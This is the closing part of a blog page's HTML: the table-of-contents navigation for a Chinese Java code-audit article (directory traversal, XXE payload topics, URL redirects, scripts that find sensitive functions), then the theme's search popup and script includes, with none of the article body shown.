href="#Linux%E7%B3%BB%E7%BB%9F%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="nav-number">12.2.2.</span> <span class="nav-text">Linux系统敏感文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97-1"><span class="nav-number">12.2.3.</span> <span class="nav-text">关键字</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Jtopcms%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="nav-number">12.3.</span> <span class="nav-text">Jtopcms目录穿越</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE"><span class="nav-number">13.</span> <span class="nav-text">XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM"><span class="nav-number">13.1.</span> <span class="nav-text">DOM</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SAX"><span class="nav-number">13.2.</span> <span class="nav-text">SAX</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JDOM"><span class="nav-number">13.3.</span> <span class="nav-text">JDOM</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM4J"><span class="nav-number">13.4.</span> <span class="nav-text">DOM4J</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Digester"><span class="nav-number">13.5.</span> <span class="nav-text">Digester</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97-2"><span class="nav-number">13.6.</span> <span class="nav-text">关键字</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE-payload"><span class="nav-number">13.7.</span> <span class="nav-text">XXE payload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="nav-number">13.7.1.</span> <span class="nav-text">读文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82-DNSLog"><span class="nav-number">13.7.2.</span> <span class="nav-text">请求 DNSLog</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF-%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91%EF%BC%88%E8%BF%99%E4%B8%AA%E6%8B%BF%E6%9C%AC%E5%9C%B03306%E6%B5%8B%E8%AF%95%E4%BA%86%E4%B8%80%E4%B8%8B%EF%BC%8C%E5%A4%B1%E8%B4%A5%E4%BA%86%EF%BC%89"><span class="nav-number">13.7.3.</span> <span class="nav-text">SSRF 探测内网（这个拿本地3306测试了一下，失败了）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DoS-%E6%94%BB%E5%87%BB%EF%BC%88%E6%9C%AC%E5%9C%B0%E6%B5%8B%E4%BA%86%E4%B8%80%E4%BA%9B%E5%A5%BD%E5%83%8F%E6%B2%A1%E5%95%A5%E7%94%A8%EF%BC%89"><span class="nav-number">13.7.4.</span> <span class="nav-text">DoS 攻击（本地测了一些好像没啥用）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#URL%E8%B7%B3%E8%BD%AC"><span class="nav-number">14.</span> <span class="nav-text">URL跳转</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97-3"><span class="nav-number">14.1.</span> <span class="nav-text">关键字</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#301-%E9%87%8D%E5%AE%9A%E5%90%91-setHeader"><span class="nav-number">14.2.</span> <span class="nav-text">301 重定向 - setHeader</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#302-%E9%87%8D%E5%AE%9A%E5%90%91-sendRedirect"><span class="nav-number">14.3.</span> <span class="nav-text">302 重定向 - sendRedirect</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%90%9C%E7%B4%A2%E6%95%8F%E6%84%9F%E5%87%BD%E6%95%B0%E7%9A%84%E8%84%9A%E6%9C%AC"><span class="nav-number">15.</span> <span class="nav-text">搜索敏感函数的脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#javaid-py"><span class="nav-number">15.0.1.</span> <span class="nav-text">javaid.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#regexp-xml"><span class="nav-number">15.0.2.</span> <span class="nav-text">regexp.xml</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%90%9C%E7%B4%A2%E5%85%B3%E9%94%AE%E5%AD%97%E7%9A%84%E4%B8%80%E4%B8%AA%E8%84%9A%E6%AD%A5"><span class="nav-number">15.0.3.</span> <span class="nav-text">搜索关键字的一个脚步</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF%E8%AE%B0%E5%BD%95"><span class="nav-number">16.</span> <span class="nav-text">报错信息记录</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1"><span class="nav-number">16.1.</span> <span class="nav-text">1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2"><span class="nav-number">16.2.</span> <span class="nav-text">2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">17.</span> <span class="nav-text">参考</span></a></li></ol>
    </div>
</div>
        </aside>
    

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="Search..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/dark-light-toggle.js"></script>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/local-search.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/code-copy.js"></script>




<div class="post-scripts pjax">
    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/toc.js"></script>
    
</div>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/libs/pjax.min.js"></script>
<script>
    window.addEventListener('DOMContentLoaded', () => {
        const pjax = new Pjax({
            selectors: [
                'head title',
                '.page-container',
                '.pjax'
            ],
            history: true,
            debug: false,
            cacheBust: false,
            timeout: 0,
            analytics: false,
            currentUrlFullReload: false,
            scrollRestoration: false,
            // scrollTo: true,
        });

        document.addEventListener('pjax:send', () => {
            KEEP.utils.pjaxProgressBarStart();
        });

        document.addEventListener('pjax:complete', () => {
            KEEP.utils.pjaxProgressBarEnd();
            pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
            KEEP.refresh();
        });
    });
</script>



</body>
</html>
